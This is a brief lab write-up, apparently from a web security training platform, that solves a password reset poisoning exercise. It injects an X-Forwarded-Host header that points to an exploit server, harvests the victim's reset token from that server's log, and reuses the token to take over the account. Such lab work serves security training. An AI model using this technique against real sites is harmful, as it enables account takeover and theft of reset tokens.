Vulnerable - Password reset poisoning via middleware

Goal: Login as the user carlos

Given information:
My credentials: username: wiener , password: peter

Victim username: carlos

Analysis:
--------

My exploit server url: https://exploit-0a4800ec04181bfbc0c2518901400024.web-security-academy.net/

X-Forwarded-Host header is supported

The request -> POST /forgot-password HTTP/1.1
add this to the request-> X-Forwarded-Host: My expolit server url without https://
set username -> carlos

After that go to your exploit server then access log  you should find a GET /forgot-password request with the victim token copy that token

Victim token: ncJefjXCmh3nGGog9Nm6HJ9cVjCHIDAI

Now go to your client emali click on the link and before you send the request
-> set the temp-forgot-password-token to the Victim token
